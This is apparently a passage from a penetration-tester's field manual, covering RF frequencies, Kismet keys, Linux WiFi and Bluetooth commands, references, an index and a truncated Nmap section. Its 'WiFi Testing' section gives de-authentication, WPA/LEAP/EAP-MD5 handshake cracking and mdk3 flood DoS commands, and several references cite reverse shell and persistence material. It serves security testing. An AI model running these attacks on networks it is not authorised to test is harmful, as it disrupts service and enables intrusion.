# Frequency Chart
- RFID: 120-150 kHz (LF), 13.56 MHz (HF), 433 MHz (UHF)
- Keyless Entry: 315 MHz (North America), 433.92 MHz (Europe, Asia)
- Cellular (US): 698-894 MHz, 1710-1755 MHz, 1850-1910 MHz, 2110-2155 MHz
- GPS: 1227.60 MHz, 1575.42 MHz
- L Band: 1-2 GHz
- 802.15.4 (ZigBee): 868 MHz (Europe), 915 MHz (US, Australia), 2.4 GHz (worldwide)
- 802.15.1 (Bluetooth): 2.4-2.483.5 GHz
- 802.11b/g: 2.4 GHz
- 802.11a: 5.0 GHz
- 802.11n: 2.4/5.0 GHz
- C Band: 4-8 GHz
- Ku Band: 12-18 GHz
- K Band: 18-26.5 GHz
- Ka Band: 26.5-40 GHz

## FCC ID Lookup
- [FCC ID Lookup](https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm)

## Frequency Database
- [RadioReference Frequency Database](http://www.radioreference.com/apps/db/)

## Kismet Reference
- `j` List Kismet servers
- `h` Help
- `f` Toggle full-screen view
- `n` Name current network
- `m` Toggle muting of sound
- `i` View detailed information for network
- `t` Tag or untag selected network
- `s` Sort network list
- `g` Group tagged networks
- `l` Show wireless card power levels
- `u` Ungroup current group
- `d` Dump printable strings
- `c` Show clients in current network
- `r` Packet rate graph
- `L` Lock channel hopping to selected channel
- `a` View network statistics
- `H` Return to normal channel hopping
- `p` Dump packet type
- `+` Expand/collapse groups
- `f` Follow network center
- `CTRL+L` Re-draw the screen
- `w` Track alerts
- `Q` Quit Kismet
- `X` Close popup window

## Linux WiFi Commands
- **Identify WiFi Problems:**
  ```bash
  rfkill list
  ```
- **Turn On WiFi:**
  ```bash
  rfkill unblock all
  ```
- **Monitor All Interfaces:**
  ```bash
  airodump-ng mon0
  ```

## Connect to Unsecured WiFi
```bash
iwconfig ath0 essid $SSID
ifconfig ath0 up
dhclient ath0
```

## Connect to WEP WiFi Network
```bash
iwconfig ath0 essid $SSID key $KEY
ifconfig ath0 up
dhclient ath0
```

## Connect to WPA-PSK WiFi Network
```bash
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa_supplicant -B -i ath0 -c wpa-psk.conf
dhclient ath0
```

## Connect to WPA-Enterprise WiFi Network
```bash
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa_supplicant -B -i ath0 -c wpa-enterprise.conf
dhclient ath0
```

## Linux Bluetooth
- **Turn On Bluetooth Interface:**
  ```bash
  hciconfig hci0 up
  ```
- **Scan for Bluetooth Devices:**
  ```bash
  hcitool -i hci0 scan --flush --all
  ```
- **List Open Services:**
  ```bash
  sdptool browse BD_ADDR
  ```
- **Set as Discoverable:**
  ```bash
  hciconfig hci0 name "NAME" class 0x520204
  ```
- **Clear pand Sessions:**
  ```bash
  pand -K
  ```

## Linux WiFi Testing
- **Start Monitor Mode Interface:**
  ```bash
  airmon-ng stop ath0
  airmon-ng start wifi0
  iwconfig ath0 channel $CH
  ```
- **Capture Client Handshake:**
  ```bash
  airodump-ng -c $CH --bssid $AP -w file ath0 # Capture traffic
  aireplay-ng -0 10 -a $AP -c $CH ath0 # Force client de-auth
  ```
- **Brute Force Handshake:**
  ```bash
  aircrack-ng -w wordlist capture.cap # WPA-PSK
  asleep -r capture.cap -w dict.asleep # LEAP
  eapmd5pass -r capture.cap -w wordlist # EAP-MD5
  ```
- **DoS Attacks:**
  ```bash
  mdk3 int a -a $AP # Auth Flood
  mdk3 int b -c $CH # Beacon Flood
  ```

## References
- [1] t1ubix. Linux/Unix/BSD Post-Exploitation Command List.
  <http://bit.ly/nucONO>. Accessed on 1 Oct 2012.
- [2] Tomes, Tim. Safely Dumping Hashes from Live Domain Controllers.
  <http://blog.spiderlabs.com/2012/06/safely-dumping-hashes-from-live-domain-controllers.html>. Accessed on 14 Nov 2012.
- [3] Reverse Shell Cheat Sheet.
  <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>. Accessed on 15 Nov 2012.
- [4] Damele, Bernardo. Reverse Shell One-liners.
  <http://bernardodamele.blogspot.com/2009/09/reverse-shells-one-liners.html>. Accessed on 15 Nov 2012.
- [5] SANS Institute. IEEE 802.11 Pocket Reference Guide.
  <http://www.willhackforsushi.com/papers/80211-Pocket-Reference-Guide.pdf>. Accessed on 16 Nov 2012.
- [6] Tomes, Tim. Remote Malware Deployment and a Lil' AV Bypass.
  <http://pauldotcom.com/2012/05/remote-malware-deployment-and.html>. Accessed on 22 Jan 2013.
- [7] Trusted Sec. PowerShell PoC.
  <https://www.trustedsec.com/downloads/tools-downloads/>. Accessed on 25 Jan 2013.
- [8] SSL and stunnel.
  <http://www.hoptrix.com/blog/?p=68>. Accessed on 01 Feb 2013.
- [9] Using Nmap to Screenshot Web Services.
  <http://blog.spiderlabs.com/2012/06/using-nmap-to-screenshot-web-services.html>. Accessed on 26 Feb 2013.
- [10] Schtasks Persistence with PowerShell One Liners.
  <http://blog.strategycorporate.it/2013/11/09/schtasks-persistence-with-powershell-one-liners/>. Accessed on 21 Nov 2013.

## Index
- **Airmon-ng** ................................. 87
- **Kali** .................................... 12
- **Scapy** ................................. 80
- **ARPing** ........................... 38
- **Kismet** ............................... 85
- **Screen** ............................... 11
- **ASCII Table** ........................ 83
- **Linux** .............................. 86
- **SNMP** .............................. 38
- **SNMPWalk** ........................ 38
- **Socat** ........................... 37, 47
- **Socks** ........................... 47, 58
- **Basic Auth** ......................... 69
- **Chkconfig** .......................... 11
- **Solaris** .............................. 7
- **SQLMap** ........................... 12
- **SSH** ................................. 55
- **Scripting** ........................ 8
- **Update-rc.d** ........................ 11
- **Stunnel** ............................ 47
- **Tandberg** ........................... 48
- **MSFPayload** ................ 56
- **TCPDump** .................... 12, 39
- **MSFVenom** .................. 56
- **TCPReplay** ......................... 39
- **Meterpreter** ................ 24, 58
- **DNS** ................... 8, 30, 39, 43
- **DNSRecon** ......................... 39
- **Mimikatz** ........................... 61
- **DSQuery** ............................ 28
- **Email Sender** ..................... 23
- **Ettercap** ............................ 60
- **FCC** .................................. 85
- **File Transfer** ..................... 43
- **Fpipe** ................................ 47
- **Frequencies** ...................... 85
- **GRUB** .............................. 46
- **Hashing** ............................. 64
- **HPing3** ............................. 40
- **Hydra** .............................. 62
- **ICMP** ............................... 10
- **IKE-Scan** ........................... 40
- **IPtables** ............................. 10
- **IPv4** ................................... 36
- **IPv6** .................................. 37
- **Java Applet** ...................... 68
- **John the Ripper** ................. 62
- **Nmap** ........................ 39, 51
- **Netcat** ......................... 44, 53
- **Open Mail Relay** .............. 43
- **Peeping Tom** ...................... 70
- **pfSense** ............................. 18
- **Postgres** ............................ 73
- **Putty** ................................. 44
- **Python** .............................. 44
- **Regex** ................................ 82
- **Reverse Shells** ................... 44
- **RDP** ............................. 19
- **Registry** ........................... 26
- **PSEXEC** ........................ 18, 46
- **Scripting Engine** Notable Scripts
  - **Nmap Scripting Engine**
    - `-sC` Run default scripts
    - `--script=<script>` Run individual or groups of scripts
    - `--script-args=<args>` Use the list of script arguments
    - `--script-updatedb` Update script database
  - **Example: DNS Zone Transfer**
    ```bash
    nmap --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=example.com -p53
    ```
- **Base Syntax**
  ```bash
  nmap [ScanType] [Options] {targets}
  ```
- **Target Specification**
  - IPv4 address: 192.168.1.1